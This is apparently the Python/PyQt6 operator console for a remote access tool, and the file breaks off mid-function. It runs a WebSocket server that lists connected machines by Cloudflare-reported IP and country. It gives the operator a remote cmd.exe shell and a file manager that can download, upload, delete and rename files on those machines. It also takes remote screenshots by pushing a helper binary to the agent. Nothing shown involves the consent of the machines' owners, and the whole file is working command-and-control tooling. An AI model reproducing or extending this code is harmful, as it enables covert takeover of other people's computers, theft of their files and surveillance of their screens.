import sys
import os
import socket
import threading
import hashlib
import base64
import time
import struct
import random
import traceback
from datetime import datetime
from PyQt6.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout,
                             QLabel, QLineEdit, QPushButton, QListView, QTextEdit, QDialog,
                             QMenu, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
                             QInputDialog, QFileDialog, QProgressBar, QColorDialog,
                             QMessageBox, QCheckBox)
from PyQt6.QtCore import Qt, QAbstractListModel, QVariant, QModelIndex, pyqtSignal, QObject, pyqtSlot, QTimer
from PyQt6.QtGui import QColor, QPixmap

try:
    from cryptography.hazmat.primitives.ciphers.aead import AESGCM
    HAS_AESGCM = True
except ImportError:
    HAS_AESGCM = False

WS_OP_CONTINUE = 0x00
WS_OP_TEXT = 0x01
WS_OP_BINARY = 0x02
WS_OP_CLOSE = 0x08
WS_OP_PING = 0x09
WS_OP_PONG = 0x0A

FILE_CHUNK = 32768
UPLOAD_WINDOW = 8
HELPER_CHUNK = 32768

DARK_BG = "#000000"
DARK_SEL_BG = "#003300"
DARK_BORDER = "#00aa00"
DARK_BTN_BG = "#0a0a0a"
DARK_BTN_HOVER = "#003300"
DARK_DISABLED = "#005500"
DARK_PROGRESS_CHUNK = "#00aa00"


def log_console(msg: str):
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"[{ts}] {msg}", flush=True)


def hexdump_short(data: bytes, maxlen: int = 16) -> str:
    if data is None:
        return "None"
    n = min(len(data), maxlen)
    s = data[:n].hex()
    if len(data) > n:
        s += f"...(total {len(data)} bytes)"
    return s


def ws_compute_accept(key: bytes) -> bytes:
    magic = b"258EAFA5-E914-47DA-95CA-C5AB0DC85B11"
    sha1 = hashlib.sha1(key + magic).digest()
    return base64.b64encode(sha1)


def ws_unmask_payload(payload: bytes, mask_key: bytes) -> bytes:
    return bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))


def ws_build_server_frame(fin: bool, opcode: int, payload: bytes) -> bytes:
    header = bytearray()
    b1 = (0x80 if fin else 0) | (opcode & 0x0f)
    header.append(b1)
    length = len(payload)
    if length <= 125:
        header.append(length)
    elif length <= 0xFFFF:
        header.append(126)
        header.extend(struct.pack(">H", length))
    else:
        header.append(127)
        header.extend(struct.pack(">Q", length))
    return bytes(header) + payload


def ws_parse_frame(data: bytearray):
    if len(data) < 2:
        return (None, None, None, 0)
    p = 0
    b1 = data[p]; p += 1
    b2 = data[p]; p += 1
    fin = bool(b1 & 0x80)
    opcode = b1 & 0x0F
    has_mask = bool(b2 & 0x80)
    payload_len = b2 & 0x7F
    if payload_len == 126:
        if len(data) < p + 2: return (None, None, None, 0)
        payload_len = struct.unpack(">H", data[p:p+2])[0]; p += 2
    elif payload_len == 127:
        if len(data) < p + 8: return (None, None, None, 0)
        payload_len = struct.unpack(">Q", data[p:p+8])[0]; p += 8
    mask_key = b""
    if has_mask:
        if len(data) < p + 4: return (None, None, None, 0)
        mask_key = data[p:p+4]; p += 4
    total_need = p + payload_len
    if len(data) < total_need:
        return (None, None, None, 0)
    raw_payload = data[p:p+payload_len]
    payload = ws_unmask_payload(raw_payload, mask_key) if has_mask else raw_payload
    return (fin, opcode, payload, total_need)


def ws_handle_http_upgrade(sock: socket.socket):
    buf = bytearray()
    start = time.time()
    try:
        while True:
            if time.time() - start > 8:
                log_console("[握手] 超时")
                return False, "", "", ""
            chunk = sock.recv(1024)
            if not chunk:
                time.sleep(0.01); continue
            buf.extend(chunk)
            if b"\r\n\r\n" in buf:
                break
    except Exception as e:
        log_console(f"[握手] 读取异常: {e}")
        return False, "", "", ""

    first_line = buf.split(b"\r\n")[0]
    parts = first_line.split(b" ")
    if len(parts) < 3:
        log_console(f"[握手] 首行不合法: {first_line!r}")
        return False, "", "", ""
    method, path, proto = parts
    if path not in (b"/", b"/ws"):
        log_console(f"[握手] 路径不匹配: {path!r}")
        return False, "", "", ""

    headers = {}
    for line in buf.split(b"\r\n")[1:]:
        if not line: continue
        if b":" in line:
            k_raw, v_raw = line.split(b":", 1)
            headers[bytes(k_raw).strip().lower()] = bytes(v_raw).strip()

    real_ip = headers.get(b"cf-connecting-ip", b"").decode("utf-8").strip()
    country = headers.get(b"cf-ipcountry", b"").decode("utf-8").strip() or "XX"
    display_name = f"[{country}] {real_ip}" if real_ip else f"[{country}] 未知IP"

    conn_val = headers.get(b"connection", b"")
    upgrade_val = headers.get(b"upgrade", b"")
    ws_key = headers.get(b"sec-websocket-key")
    ws_version = headers.get(b"sec-websocket-version")

    log_console(f"[握手] 请求 {method.decode(errors='replace')} "
                f"{path.decode(errors='replace')} IP={real_ip or '(无)'} 国家={country}")

    if conn_val != b"Upgrade":
        log_console(f"[握手] 失败 Connection={conn_val!r}")
        return False, real_ip, country, display_name
    if upgrade_val != b"websocket":
        log_console(f"[握手] 失败 Upgrade={upgrade_val!r}")
        return False, real_ip, country, display_name
    if not ws_key:
        log_console("[握手] 失败 缺少 Sec-WebSocket-Key")
        return False, real_ip, country, display_name
    if ws_version != b"13":
        log_console(f"[握手] 失败 Version={ws_version!r}")
        return False, real_ip, country, display_name

    accept_val = ws_compute_accept(ws_key)
    resp = (b"HTTP/1.1 101 Switching Protocols\r\n"
            b"Upgrade: websocket\r\n"
            b"Connection: Upgrade\r\n"
            b"Sec-WebSocket-Accept: " + accept_val + b"\r\n\r\n")
    try:
        sock.sendall(resp)
        log_console(f"[握手] 成功 {display_name}")
    except Exception as e:
        log_console(f"[握手] 响应发送失败: {e}")
        return False, real_ip, country, display_name
    return True, real_ip, country, display_name


class ClientSignals(QObject):
    on_outp = pyqtSignal(object, str)
    on_disconnect = pyqtSignal(object)
    on_fs = pyqtSignal(object, bytes)
    on_screen = pyqtSignal(object, bytes)
    on_mode = pyqtSignal(object)
    on_helper_needed = pyqtSignal(object)
    on_helper_ack = pyqtSignal(object, bytes)
    on_helper_ready = pyqtSignal(object)
    on_helper_err = pyqtSignal(object, str)


class ClientSession:
    def __init__(self, conn, ip, country, display_name):
        self.conn = conn
        self.ip = ip
        self.country = country
        self.display_name = display_name
        self.last_pong = datetime.now()
        self.connected = True
        self._recv_buf = bytearray()
        self.signals = ClientSignals()
        self._send_lock = threading.Lock()
        self._frag_buf = bytearray()
        self._frag_opcode = 0

        self.is_service_mode = None
        self.shot_key = None
        self.helper_uploaded = False
        self.helper_uploading = False

    def send_packet(self, body: bytes) -> bool:
        if not self.connected:
            log_console(f"[发送] {self.display_name} 连接已断开，包丢弃 cmd={body[:4]!r}")
            return False
        try:
            full_body = struct.pack(">I", len(body)) + body
            ws_frame = ws_build_server_frame(True, WS_OP_BINARY, full_body)
            with self._send_lock:
                self.conn.sendall(ws_frame)
            log_console(f"[发送] {self.display_name} cmd={body[:4]!r} "
                        f"body_len={len(body)} ws_len={len(ws_frame)}")
            return True
        except (OSError, BrokenPipeError) as e:
            log_console(f"[发送] {self.display_name} 失败: {e}")
            self.close()
            return False

    def reset_fragment(self):
        self._frag_buf.clear()
        self._frag_opcode = 0

    def close(self):
        if not self.connected:
            return
        self.connected = False
        log_console(f"[关闭] {self.display_name}")
        try:
            self.conn.sendall(ws_build_server_frame(True, WS_OP_CLOSE, b""))
        except Exception:
            pass
        try: self.conn.shutdown(socket.SHUT_RDWR)
        except Exception: pass
        try: self.conn.close()
        except Exception: pass


class RemoteCmdDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.setWindowTitle(f"远程CMD - {client_session.display_name}")
        self.resize(680, 450)
        self.client = client_session
        self.is_alive = True

        lay = QVBoxLayout(self)
        info_bar = QHBoxLayout()
        info_bar.addWidget(QLabel(f"🌍 国家: {client_session.country}"))
        info_bar.addWidget(QLabel(f"📡 IP: {client_session.ip}"))
        info_bar.addStretch()
        lay.addLayout(info_bar)

        self.out_box = QTextEdit()
        self.out_box.setReadOnly(True)
        lay.addWidget(self.out_box)

        input_lay = QHBoxLayout()
        self.cmd_input = QLineEdit()
        self.cmd_input.setPlaceholderText("输入命令回车执行")
        self.cmd_input.returnPressed.connect(self.on_enter_command)
        input_lay.addWidget(self.cmd_input)
        lay.addLayout(input_lay)

        self.out_box.append(f"==== 连接 {client_session.display_name} 远程CMD ====\n[*] 已发送SPAW启动被控端cmd.exe")
        log_console(f"[CMD] 打开会话 {client_session.display_name}，发送 SPAW")
        self.client.send_packet(b"SPAW")

        if parent and hasattr(parent, 'is_dark_mode'):
            self.apply_theme(parent.is_dark_mode, parent.fg_color)

    def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
        if dark:
            self.setStyleSheet(f"""
                QDialog {{ background-color: {DARK_BG}; }}
                QLabel {{ color: {fg_color}; }}
                QTextEdit {{
                    background-color: {DARK_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
                QLineEdit {{
                    background-color: {DARK_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
            """)
        else:
            self.setStyleSheet("")

    @pyqtSlot(str)
    def append_text(self, text: str):
        self.out_box.append(text)

    def on_enter_command(self):
        cmd = self.cmd_input.text().strip()
        self.cmd_input.clear()
        if not self.is_alive or not self.client.connected:
            self.out_box.append("\n[!] 连接断开")
            log_console(f"[CMD] {self.client.display_name} 发送失败：连接已断开")
            return
        payload = b"EXEK" + cmd.encode("gbk", errors="replace")
        log_console(f"[CMD] {self.client.display_name} 发送命令: {cmd}")
        ok = self.client.send_packet(payload)
        self.out_box.append(f"> {cmd}")
        if not ok:
            self.out_box.append("[发送失败]")
            log_console(f"[CMD] {self.client.display_name} 命令发送失败")

    def closeEvent(self, event):
        self.is_alive = False
        log_console(f"[CMD] 关闭会话 {self.client.display_name}")
        if self.client.connected:
            self.client.send_packet(b"KILL")
        try:
            self.client.signals.on_outp.disconnect(self.append_text)
        except Exception:
            pass
        if self.main_window and self.client in self.main_window.open_cmd_dialogs:
            if self.main_window.open_cmd_dialogs[self.client] is self:
                del self.main_window.open_cmd_dialogs[self.client]
        super().closeEvent(event)


class FileManagerDialog(QDialog):
    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.client = client_session
        self.setWindowTitle(f"远程文件管理 - {client_session.display_name}")
        self.resize(900, 620)

        self._closing = False
        self.current_path = ""
        self.download_buf = bytearray()
        self.download_total = 0
        self.download_name = ""
        self.upload_file = None
        self.upload_total = 0
        self.upload_sent = 0
        self.upload_acked = 0
        self.upload_inflight = 0
        self.upload_path = ""
        self.fs_events = []

        lay = QVBoxLayout(self)
        path_lay = QHBoxLayout()
        self.path_edit = QLineEdit()
        self.path_edit.setPlaceholderText("输入路径，如 C:\\ 或 C:\\Users")
        self.path_edit.returnPressed.connect(self.on_go)
        path_lay.addWidget(self.path_edit)
        btn_go = QPushButton("转到"); btn_go.clicked.connect(self.on_go); path_lay.addWidget(btn_go)
        btn_up = QPushButton("上级"); btn_up.clicked.connect(self.on_up); path_lay.addWidget(btn_up)
        btn_refresh = QPushButton("刷新"); btn_refresh.clicked.connect(self.on_refresh); path_lay.addWidget(btn_refresh)
        lay.addLayout(path_lay)

        self.progress_label = QLabel("")
        lay.addWidget(self.progress_label)

        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        self.progress_bar.setTextVisible(True)
        self.progress_bar.setMaximumHeight(18)
        lay.addWidget(self.progress_bar)

        self.tree = QTreeWidget()
        self.tree.setHeaderLabels(["名称", "大小", "类型", "完整路径"])
        self.tree.setColumnWidth(0, 260)
        self.tree.setColumnWidth(1, 100)
        self.tree.setColumnWidth(2, 60)
        self.tree.itemDoubleClicked.connect(self.on_double_click)
        self.tree.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu)
        self.tree.customContextMenuRequested.connect(self.on_context_menu)
        lay.addWidget(self.tree)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setMaximumHeight(100)
        lay.addWidget(self.log_box)

        self.timer = QTimer(self)
        self.timer.setInterval(50)
        self.timer.timeout.connect(self.process_fs_events)
        self.timer.start()

        log_console(f"[文件管理] 打开 {client_session.display_name}")
        if parent and hasattr(parent, 'is_dark_mode'):
            self.apply_theme(parent.is_dark_mode, parent.fg_color)

    def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
        if dark:
            self.setStyleSheet(f"""
                QDialog {{ background-color: {DARK_BG}; }}
                QLabel {{ color: {fg_color}; }}
                QLineEdit {{
                    background-color: {DARK_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
                QTreeWidget {{
                    background-color: {DARK_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
                QTreeWidget::item:selected {{
                    background-color: {DARK_SEL_BG};
                    color: {fg_color};
                }}
                QTreeWidget QHeaderView::section {{
                    background-color: {DARK_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    padding: 3px;
                }}
                QTextEdit {{
                    background-color: {DARK_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
                QPushButton {{
                    background-color: {DARK_BTN_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    padding: 4px 10px;
                    font-family: Consolas, "Courier New", monospace;
                }}
                QPushButton:hover {{ background-color: {DARK_BTN_HOVER}; }}
                QPushButton:disabled {{ color: {DARK_DISABLED}; }}
                QProgressBar {{
                    background-color: {DARK_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    text-align: center;
                    font-family: Consolas, "Courier New", monospace;
                }}
                QProgressBar::chunk {{ background-color: {DARK_PROGRESS_CHUNK}; }}
            """)
        else:
            self.setStyleSheet("")

    def log(self, msg):
        self.log_box.append(msg)
        log_console(f"[文件管理 {self.client.display_name}] {msg}")

    def on_fs_data(self, sess, body: bytes):
        if self._closing:
            return
        self.fs_events.append(bytes(body))

    def process_fs_events(self):
        if self._closing:
            return
        while self.fs_events:
            body = self.fs_events.pop(0)
            self.handle_fs_packet(body)

    def handle_fs_packet(self, body: bytes):
        if len(body) < 4: return
        cmd = body[0:4]
        payload = body[4:]

        if cmd == b"FDRV":
            text = payload.decode("gbk", errors="replace")
            drives = [d for d in text.split("|") if d]
            log_console(f"[文件管理] FDRV 驱动器: {drives}")
            self.tree.clear()
            for d in drives:
                d_full = d if d.endswith("\\") else d + "\\"
                item = QTreeWidgetItem([d_full, "", "驱动器", d_full])
                self.tree.addTopLevelItem(item)

        elif cmd == b"FDIR":
            text = payload.decode("gbk", errors="replace")
            log_console(f"[文件管理] FDIR 长度={len(text)}")
            self.tree.clear()
            for entry in text.split(";"):
                if not entry: continue
                parts = entry.split("|")
                if len(parts) < 4: continue
                name, full, size, typ = parts[0], parts[1], parts[2], parts[3]
                try:
                    sz = int(size)
                    size_str = self.format_size(sz) if typ == "F" else ""
                except ValueError:
                    size_str = ""
                type_str = "目录" if typ == "D" else "文件"
                item = QTreeWidgetItem([name, size_str, type_str, full])
                self.tree.addTopLevelItem(item)

        elif cmd == b"FMET":
            text = payload.decode("gbk", errors="replace")
            parts = text.split("|", 1)
            if len(parts) == 2:
                self.download_name = parts[0]
                self.download_total = int(parts[1])
                self.download_buf = bytearray()
                log_console(f"[文件管理] FMET 开始下载 {self.download_name} "
                            f"总大小={self.download_total}")
                self.progress_bar.setValue(0)
                self.progress_label.setText(
                    f"[下载] {self.download_name} 0 / {self.format_size(self.download_total)}")

        elif cmd == b"FDAT":
            if len(payload) < 8: return
            if self.download_total == 0:
                log_console("[文件管理] FDAT 但无下载会话，忽略")
                return
            offset = struct.unpack("<Q", payload[0:8])[0]
            data = payload[8:]
            if offset == len(self.download_buf):
                self.download_buf.extend(data)
            else:
                if offset > len(self.download_buf):
                    self.download_buf.extend(b"\x00" * (offset - len(self.download_buf)))
                self.download_buf[offset:offset+len(data)] = data
            if self.download_total > 0:
                pct = len(self.download_buf) * 100 // self.download_total
                if pct > 100: pct = 100
                self.progress_bar.setValue(pct)
                self.progress_label.setText(
                    f"[下载] {self.format_size(len(self.download_buf))} / "
                    f"{self.format_size(self.download_total)} ({pct}%)")

        elif cmd == b"FPRO":
            if len(payload) >= 12:
                if self.download_total == 0:
                    return
                prog = struct.unpack("<Q", payload[0:8])[0]
                tot = struct.unpack("<I", payload[8:12])[0]
                if tot > 0:
                    pct = prog * 100 // tot
                    if pct > 100: pct = 100
                    self.progress_bar.setValue(pct)
                    self.progress_label.setText(
                        f"[下载] {self.format_size(prog)} / "
                        f"{self.format_size(tot)} ({pct}%)")

        elif cmd == b"FDON":
            if self.download_total == 0:
                log_console("[文件管理] 忽略无主 FDON")
                return
            if len(payload) >= 8:
                server_total = struct.unpack("<Q", payload[0:8])[0]
            else:
                server_total = self.download_total
            log_console(f"[文件管理] FDON 实际收到={len(self.download_buf)} "
                        f"声明={server_total}")
            self.progress_bar.setValue(100)
            self.finish_download()

        elif cmd == b"FACK":
            if len(payload) >= 8:
                if self.upload_inflight > 0:
                    self.upload_inflight -= 1
                self.upload_acked += 1
                log_console(f"[文件管理] FACK 已确认={self.upload_acked} "
                            f"在途={self.upload_inflight}")
                if self.upload_file and self.upload_sent < self.upload_total:
                    self.send_next_upload_chunk()
                elif (self.upload_sent >= self.upload_total
                      and self.upload_inflight == 0
                      and self.upload_file):
                    self.upload_file.close()
                    self.upload_file = None
                    log_console(f"[文件管理] 上传完成 {self.upload_path} "
                                f"({self.upload_total} 字节)")
                    self.log("[上传完成]")
                    self.progress_bar.setValue(100)
                    self.progress_label.setText(
                        f"[上传完成] {self.format_size(self.upload_total)}")
                    QTimer.singleShot(500, self.on_refresh)

        elif cmd == b"FOK0":
            log_console("[文件管理] FOK0")
            if self.upload_file and self.upload_sent == 0:
                self.send_next_upload_chunk()

        elif cmd == b"FERR":
            msg = payload.decode("gbk", errors="replace")
            log_console(f"[文件管理] FERR: {msg}")
            self.log(f"[错误] {msg}")

    def finish_download(self):
        if not self.download_buf:
            log_console("[文件管理] 下载缓冲区为空，取消")
            self.download_buf = bytearray()
            self.download_total = 0
            self.download_name = ""
            self.progress_bar.setValue(0)
            self.progress_label.setText("")
            return
        save_path, _ = QFileDialog.getSaveFileName(self, "保存文件", self.download_name)
        if save_path:
            try:
                with open(save_path, "wb") as f:
                    f.write(self.download_buf)
                log_console(f"[文件管理] 下载完成 {save_path} "
                            f"({len(self.download_buf)} 字节)")
            except OSError as e:
                log_console(f"[文件管理] 下载写入失败: {e}")
        else:
            log_console("[文件管理] 下载取消")
        self.download_buf = bytearray()
        self.download_total = 0
        self.download_name = ""
        self.progress_bar.setValue(0)
        self.progress_label.setText("")

    @staticmethod
    def format_size(n):
        for unit in ["B", "KB", "MB", "GB", "TB"]:
            if n < 1024: return f"{n:.1f} {unit}"
            n /= 1024
        return f"{n:.1f} PB"

    def update_upload_progress(self):
        if self.upload_total > 0:
            pct = self.upload_sent * 100 // self.upload_total
            if pct > 100: pct = 100
            self.progress_bar.setValue(pct)
            self.progress_label.setText(
                f"[上传] {self.format_size(self.upload_sent)} / "
                f"{self.format_size(self.upload_total)} ({pct}%) "
                f"在途={self.upload_inflight}")

    def on_go(self):
        path = self.path_edit.text().strip()
        if path:
            self.current_path = path
            log_console(f"[文件管理] 转到 {path}")
            self.client.send_packet(b"FDIR" + path.encode("gbk", errors="replace"))

    def on_up(self):
        if not self.current_path:
            return
        p = self.current_path.rstrip("\\")
        idx = p.rfind("\\")
        if idx <= 1:
            log_console("[文件管理] 回到驱动器列表")
            self.client.send_packet(b"FDRV")
            self.current_path = ""
        else:
            self.current_path = p[:idx]
            self.path_edit.setText(self.current_path)
            log_console(f"[文件管理] 上级到 {self.current_path}")
            self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))

    def on_refresh(self):
        log_console("[文件管理] 刷新")
        if self.current_path:
            self.client.send_packet(b"FDIR" + self.current_path.encode("gbk", errors="replace"))
        else:
            self.client.send_packet(b"FDRV")

    def on_double_click(self, item, col):
        typ = item.text(2)
        full = item.text(3)
        if typ in ("目录", "驱动器"):
            self.current_path = full
            self.path_edit.setText(full)
            log_console(f"[文件管理] 双击进入 {full}")
            self.client.send_packet(b"FDIR" + full.encode("gbk", errors="replace"))
        elif typ == "文件":
            log_console(f"[文件管理] 双击下载 {full}")
            self.client.send_packet(b"FGET" + full.encode("gbk", errors="replace"))

    def on_context_menu(self, pos):
        item = self.tree.itemAt(pos)
        if not item: return
        typ = item.text(2)
        full = item.text(3)
        menu = QMenu()
        act_download = menu.addAction("下载") if typ == "文件" else None
        act_upload = menu.addAction("上传到此目录") if typ in ("目录", "驱动器") else None
        act_delete = menu.addAction("删除")
        act_rename = menu.addAction("重命名")
        act_mkdir = menu.addAction("新建文件夹") if typ in ("目录", "驱动器") else None
        ret = menu.exec(self.tree.viewport().mapToGlobal(pos))
        if act_download and ret == act_download:
            log_console(f"[文件管理] 右键下载 {full}")
            self.client.send_packet(b"FGET" + full.encode("gbk", errors="replace"))
        elif act_upload and ret == act_upload:
            self.start_upload_to(full)
        elif ret == act_delete:
            log_console(f"[文件管理] 删除 {full}")
            self.client.send_packet(b"FDEL" + full.encode("gbk", errors="replace"))
            QTimer.singleShot(500, self.on_refresh)
        elif ret == act_rename:
            new_name, ok = QInputDialog.getText(self, "重命名", "新名称:", text=item.text(0))
            if ok and new_name:
                parent = full.rsplit("\\", 1)[0]
                new_full = parent + "\\" + new_name
                payload = f"{full}|{new_full}"
                log_console(f"[文件管理] 重命名 {full} -> {new_full}")
                self.client.send_packet(b"FREN" + payload.encode("gbk", errors="replace"))
                QTimer.singleShot(500, self.on_refresh)
        elif act_mkdir and ret == act_mkdir:
            name, ok = QInputDialog.getText(self, "新建文件夹", "名称:")
            if ok and name:
                new_dir = full.rstrip("\\") + "\\" + name
                log_console(f"[文件管理] 新建目录 {new_dir}")
                self.client.send_packet(b"FMKD" + new_dir.encode("gbk", errors="replace"))
                QTimer.singleShot(500, self.on_refresh)

    def start_upload_to(self, remote_dir):
        local_path, _ = QFileDialog.getOpenFileName(self, "选择要上传的文件")
        if not local_path: return
        fname = os.path.basename(local_path)
        remote_path = remote_dir.rstrip("\\") + "\\" + fname
        try:
            self.upload_file = open(local_path, "rb")
        except OSError as e:
            log_console(f"[文件管理] 上传打开本地文件失败: {e}")
            return
        self.upload_total = os.path.getsize(local_path)
        self.upload_sent = 0
        self.upload_acked = 0
        self.upload_inflight = 0
        self.upload_path = remote_path
        args = f"{remote_path}|{self.upload_total}"
        log_console(f"[文件管理] 开始上传 {fname} ({self.upload_total} 字节) -> {remote_path}")
        self.client.send_packet(b"FPUT" + args.encode("gbk", errors="replace"))
        self.progress_bar.setValue(0)
        self.progress_label.setText(
            f"[上传] 0 / {self.format_size(self.upload_total)} (0%)")

    def send_next_upload_chunk(self):
        while (self.upload_file
               and self.upload_inflight < UPLOAD_WINDOW
               and self.upload_sent < self.upload_total):
            chunk = self.upload_file.read(FILE_CHUNK)
            if not chunk:
                break
            offset = self.upload_sent
            body = b"FDAT" + struct.pack("<Q", offset) + chunk
            if not self.client.send_packet(body):
                log_console(f"[文件管理] 发送分块失败 offset={offset}")
                break
            self.upload_sent += len(chunk)
            self.upload_inflight += 1
            self.update_upload_progress()

        if (self.upload_sent >= self.upload_total
            and self.upload_inflight == 0
            and self.upload_file):
            self.upload_file.close()
            self.upload_file = None
            log_console(f"[文件管理] 上传完成 {self.upload_path} "
                        f"({self.upload_total} 字节)")
            self.log("[上传完成]")
            self.progress_bar.setValue(100)
            self.progress_label.setText(
                f"[上传完成] {self.format_size(self.upload_total)}")
            QTimer.singleShot(500, self.on_refresh)

    def reset_transfer_state(self):
        self.download_buf = bytearray()
        self.download_total = 0
        self.download_name = ""
        if self.upload_file:
            try: self.upload_file.close()
            except Exception: pass
        self.upload_file = None
        self.upload_total = 0
        self.upload_sent = 0
        self.upload_acked = 0
        self.upload_inflight = 0
        self.upload_path = ""
        self.progress_bar.setValue(0)
        self.progress_label.setText("")

    def closeEvent(self, event):
        self._closing = True
        self.timer.stop()
        if self.client.connected:
            log_console(f"[文件管理] 关闭，发送 FABT")
            self.client.send_packet(b"FABT")
        else:
            log_console("[文件管理] 关闭，连接已断开")
        self.reset_transfer_state()
        if self.main_window and self.client in self.main_window.open_file_dialogs:
            if self.main_window.open_file_dialogs[self.client] is self:
                del self.main_window.open_file_dialogs[self.client]
        log_console(f"[文件管理] 关闭 {self.client.display_name}")
        super().closeEvent(event)


class ScreenPreviewDialog(QDialog):
    """桌面/服务两种模式共用同一套 UI 和执行流程。
    默认：点刷新 -> 发 SCRS(key) -> agent 回 SCRM/SCRV/SCRD 或 HNED
    收到 HNED -> 上传 helper -> HOK1 后就绪 -> 自动补发 SCRS
    勾选强制上传：点刷新 -> 直接上传 helper -> HOK1 后就绪 -> 自动补发 SCRS
    关闭窗口：发 SCRE 通知 agent 清理 helper 和共享内存
    """

    def __init__(self, client_session: ClientSession, parent=None):
        super().__init__(parent)
        self.main_window = parent
        self.client = client_session
        self.setWindowTitle(f"屏幕截图 - {client_session.display_name}")
        self.resize(960, 720)

        self._closing = False

        self._total = 0
        self._iv = None
        self._chunks_total = 0
        self._chunks = {}
        self._plain = None
        self._last_pixmap = None

        self._helper_file = None
        self._helper_total = 0
        self._helper_sent = 0
        self._helper_offset = 0
        self._helper_ack_pending = False
        self._helper_waiting_hok0_for_start = False
        self._helper_waiting_hok0_for_done = False
        self._pending_scrs_after_helper = False

        lay = QVBoxLayout(self)

        info_bar = QHBoxLayout()
        info_bar.addWidget(QLabel(f"🌍 {client_session.country}  📡 {client_session.ip}"))
        info_bar.addStretch()
        self.btn_refresh = QPushButton("刷新截图")
        self.btn_refresh.clicked.connect(self.request_screenshot)
        info_bar.addWidget(self.btn_refresh)
        self.btn_save = QPushButton("保存为...")
        self.btn_save.clicked.connect(self.save_screenshot)
        self.btn_save.setEnabled(False)
        info_bar.addWidget(self.btn_save)
        lay.addLayout(info_bar)

        opt_lay = QHBoxLayout()
        self.chk_force_helper = QCheckBox("强制上传 helper（覆盖 agent 端旧版）")
        self.chk_force_helper.setChecked(False)
        opt_lay.addWidget(self.chk_force_helper)
        opt_lay.addStretch()
        lay.addLayout(opt_lay)

        self.mode_label = QLabel("")
        lay.addWidget(self.mode_label)

        self.upload_label = QLabel("")
        self.upload_label.setVisible(False)
        lay.addWidget(self.upload_label)
        self.upload_bar = QProgressBar()
        self.upload_bar.setRange(0, 100)
        self.upload_bar.setValue(0)
        self.upload_bar.setTextVisible(True)
        self.upload_bar.setMaximumHeight(18)
        self.upload_bar.setVisible(False)
        lay.addWidget(self.upload_bar)

        self.recv_label = QLabel("")
        self.recv_label.setVisible(False)
        lay.addWidget(self.recv_label)
        self.recv_bar = QProgressBar()
        self.recv_bar.setRange(0, 100)
        self.recv_bar.setValue(0)
        self.recv_bar.setTextVisible(True)
        self.recv_bar.setMaximumHeight(18)
        self.recv_bar.setVisible(False)
        lay.addWidget(self.recv_bar)

        self.image_label = QLabel()
        self.image_label.setAlignment(Qt.AlignmentFlag.AlignCenter)
        self.image_label.setMinimumSize(640, 480)
        self.image_label.setStyleSheet("border: 1px solid #00aa00;")
        lay.addWidget(self.image_label, 1)

        self.log_box = QTextEdit()
        self.log_box.setReadOnly(True)
        self.log_box.setMaximumHeight(100)
        lay.addWidget(self.log_box)

        if parent and hasattr(parent, 'is_dark_mode'):
            self.apply_theme(parent.is_dark_mode, parent.fg_color)

        self._update_mode_label()
        log_console(f"[截屏] 打开窗口 {client_session.display_name}")

    def _update_mode_label(self):
        if self.client.is_service_mode is True:
            self.mode_label.setText("模式: 服务（需要 helper）")
        elif self.client.is_service_mode is False:
            self.mode_label.setText("模式: 桌面（需要 helper）")
        else:
            self.mode_label.setText("模式: 未知")

    def apply_theme(self, dark: bool, fg_color: str = "#00ff00"):
        if dark:
            self.setStyleSheet(f"""
                QDialog {{ background-color: {DARK_BG}; }}
                QLabel {{ color: {fg_color}; }}
                QCheckBox {{ color: {fg_color}; }}
                QTextEdit {{
                    background-color: {DARK_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    font-family: Consolas, "Courier New", monospace;
                }}
                QPushButton {{
                    background-color: {DARK_BTN_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    padding: 4px 10px;
                    font-family: Consolas, "Courier New", monospace;
                }}
                QPushButton:hover {{ background-color: {DARK_BTN_HOVER}; }}
                QPushButton:disabled {{ color: {DARK_DISABLED}; }}
                QProgressBar {{
                    background-color: {DARK_BG};
                    color: {fg_color};
                    border: 1px solid {DARK_BORDER};
                    text-align: center;
                    font-family: Consolas, "Courier New", monospace;
                }}
                QProgressBar::chunk {{ background-color: {DARK_PROGRESS_CHUNK}; }}
            """)
        else:
            self.setStyleSheet("")

    # ---------- 刷新入口 ----------
    def request_screenshot(self):
        log_console(f"[截屏] {self.client.display_name} 收到刷新请求")
        if self._closing:
            log_console("[截屏] 窗口已关闭，忽略")
            return
        if not self.client.connected:
            log_console("[截屏] 连接已断开，忽略")
            self.log("连接已断开")
            return
        self._reset_recv_state()

        force = self.chk_force_helper.isChecked()
        log_console(f"[截屏] 强制上传={force}")

        if force:
            self.log("勾选强制上传，先走上传 helper")
            self.client.helper_uploaded = False
            self._pending_scrs_after_helper = True
            self._start_upload_helper()
            return

        self._send_scrs()

    def _send_scrs(self):
        """只发 SCRS，不检查强制上传复选框。用于普通刷新和 helper 就绪后补发。"""
        if self._closing or not self.client.connected:
            return
        self.client.shot_key = os.urandom(32)
